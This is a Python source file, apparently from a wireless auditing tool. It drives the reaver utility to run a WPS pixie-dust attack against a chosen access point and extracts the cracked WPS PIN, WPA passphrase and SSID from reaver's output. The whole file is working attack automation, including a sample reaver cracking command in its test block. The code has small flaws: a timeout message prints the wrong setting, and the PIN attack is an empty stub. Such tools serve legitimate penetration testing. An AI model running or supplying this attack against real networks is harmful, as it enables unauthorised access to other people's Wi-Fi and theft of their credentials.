#!/usr/bin/python

from Attack import Attack
from Color import Color
from Configuration import Configuration
from CrackResultWPS import CrackResultWPS
from Process import Process

import os
import time
import re

class AttackWPS(Attack):
    def __init__(self, target):
        super(AttackWPS, self).__init__(target)
        self.success = False
        self.crack_result = None

    def run(self):
        ''' Run all WPS-related attacks '''

        # Drop out if user specified to not user Reaver
        if Configuration.no_reaver:
            self.success = False
            return self.success

        # Run Pixie-Dust attack
        if self.is_pixiedust_supported():
            if self.run_pixiedust_attack():
                # Pixie-Dust attack succeeded. We're done.
                self.success = True
                return self.success
        else:
            Color.pl(
                '{!} {R}your version of "reaver" does not' +
                ' support the {O}WPS pixie-dust attack{W}')

        if Configuration.pixie_only:
            Color.pl('{!} {O}--pixie{R} set, ignoring WPS-PIN attack{W}')
            self.success = False
        else:
            # Run WPS-PIN attack
            self.success = self.run_wps_pin_attack()
        return self.success


    def is_pixiedust_supported(self):
        ''' Checks if 'reaver' supports WPS Pixie-Dust attack '''
        output = Process(['reaver', '-h']).stderr()
        return '--pixie-dust' in output

    def run_pixiedust_attack(self):
        # Write reaver stdout to file.
        self.stdout_file = Configuration.temp('reaver.out')
        if os.path.exists(self.stdout_file):
            os.remove(self.stdout_file)

        command = [
            'reaver',
            '-i', Configuration.interface,
            '-b', self.target.bssid,
            '-c', self.target.channel,
            '-K', '1', # pixie-dust attack
            '-a', # Automatically restart session
            '-vv' # (very) verbose
        ]

        stdout_write = open(self.stdout_file, 'a')

        reaver = Process(command, stdout=stdout_write, stderr=Process.devnull())

        pin = None
        step = '0) initializing'

        while True:
            time.sleep(1)
            Color.clear_line()
            Color.p('\r{+} {C}WPS pixie-dust attack{W} ')

            stdout_write.flush()

            # Check output from reaver process
            stdout = self.get_stdout()
            stdout_last_line = stdout.split('\n')[-1]

            (pin, psk, ssid) = self.get_pin_psk_ssid(stdout)

            # Check if we cracked it, or if process stopped.
            if (pin and psk and ssid) or reaver.poll() != None:
                reaver.interrupt()

                # Check one-last-time for PIN/PSK/SSID, in case of race condition.
                stdout = self.get_stdout()
                (pin, psk, ssid) = AttackWPS.get_pin_psk_ssid(stdout)

                # Check if we cracked it.
                if pin and psk and ssid:
                    # We cracked it.
                    bssid = self.target.bssid
                    Color.pl('\n\n{+} {G}successfully cracked WPS PIN and PSK{W}\n')
                    self.crack_result = CrackResultWPS(bssid, ssid, pin, psk)
                    self.crack_result.dump()
                    return True
                else:
                    # Failed to crack, reaver proces ended.
                    Color.pl('{R}failed: {O}WPS pin not found{W}')
                    return False

            # Status updates, depending on last line of stdout
            if 'Waiting for beacon from' in stdout_last_line:
                step = '({C}step 1/8{W}) waiting for beacon'
            elif 'Associated with' in stdout_last_line:
                step = '({C}step 2/8{W}) waiting to start session'
            elif 'Starting Cracking Session.' in stdout_last_line:
                step = '({C}step 3/8{W}) waiting to try pin'
            elif 'Trying pin' in stdout_last_line:
                step = '({C}step 4/8{W}) trying pin'
            elif 'Sending EAPOL START request' in stdout_last_line:
                step = '({C}step 5/8{W}) sending eapol start request'
            elif 'Sending identity response' in stdout_last_line:
                step = '({C}step 6/8{W}) sending identity response'
            elif 'Sending M2 message' in stdout_last_line:
                step = '({C}step 7/8{W}) sending m2 message (may take a while)'
            elif 'Detected AP rate limiting,' in stdout_last_line:
                if Configuration.wps_skip_rate_limit:
                    Color.pl('{R}failed: {O}hit WPS rate-limit{W}')
                    # TODO: Argument for --ignore-rate-limit
                    '''
                    Color.pl('{!} {O}use {R}--ignore-rate-limit{O} to ignore' +
                             ' this kind of failure in the future')
                    '''
                    break
                step = '({C}step -/8{W}) waiting for AP rate limit'

            if 'WPS pin not found' in stdout:
                Color.pl('{R}failed: {O}WPS pin not found{W}')
                break

            # TODO: Timeout check
            if reaver.running_time() > Configuration.wps_pixie_timeout:
                Color.pl('{R}failed: {O}timeout after %d seconds{W}' % Configuration.wps_timeout)
                break

            # Reaver Failure/Timeout check
            fail_count = stdout.count('WPS transaction failed')
            if fail_count > Configuration.wps_fail_threshold:
                Color.pl('{R}failed: {O}too many failures (%d){W}' % fail_count)
                break
            timeout_count = stdout.count('Receive timeout occurred')
            if timeout_count > Configuration.wps_timeout_threshold:
                Color.pl('{R}failed: {O}too many timeouts (%d){W}' % timeout_count)
                break

            # Display status of Pixie-Dust attack
            Color.p('{W}%s{W}' % step)

            continue

        # Attack failed, already printed reason why
        reaver.interrupt()
        stdout_write.close()
        return False


    @staticmethod
    def get_pin_psk_ssid(stdout):
        ''' Parses WPS PIN, PSK, and SSID from output '''
        pin = psk = ssid = None

        # Check for PIN.
        # PIN: Printed *before* the attack completes.
        regex = re.search('WPS pin: *([0-9]*)', stdout)
        if regex:
            pin = regex.groups()[0]
        # PIN: Printed when attack is completed.
        regex = re.search("WPS PIN: *'([0-9]+)'", stdout)
        if regex:
            pin = regex.groups()[0]

        # Check for PSK.
        regex = re.search("WPA PSK: *'(.+)'", stdout)
        if regex:
            psk = regex.groups()[0]

        # Check for SSID
        regex = re.search("AP SSID: *'(.+)'", stdout)
        if regex:
            ssid = regex.groups()[0]

        return (pin, psk, ssid)


    def run_wps_pin_attack(self):
        # TODO Implement
        return False

    def get_stdout(self):
        ''' Gets output from stdout_file '''
        if not self.stdout_file:
            return ''
        f = open(self.stdout_file, 'r')
        stdout = f.read()
        f.close()
        return stdout.strip()


if __name__ == '__main__':
    stdout = '''
[Pixie-Dust]  
[Pixie-Dust]   Pixiewps 1.1
[Pixie-Dust]  
[Pixie-Dust]   [*] E-S1:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [*] E-S2:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [+] WPS pin:    12345678
[Pixie-Dust]  
[Pixie-Dust]   [*] Time taken: 0 s
[Pixie-Dust]  
Running reaver with the correct pin, wait ...
Cmd : reaver -i wlan0mon -b 08:86:3B:8C:FD:9C -c 11 -s y -vv -p 28097402

[Reaver Test] BSSID: AA:BB:CC:DD:EE:FF
[Reaver Test] Channel: 11
[Reaver Test] [+] WPS PIN: '12345678'
[Reaver Test] [+] WPA PSK: 'Test PSK'
[Reaver Test] [+] AP SSID: 'Test Router'
    '''
    print AttackWPS.get_pin_psk_ssid(stdout)
    pass
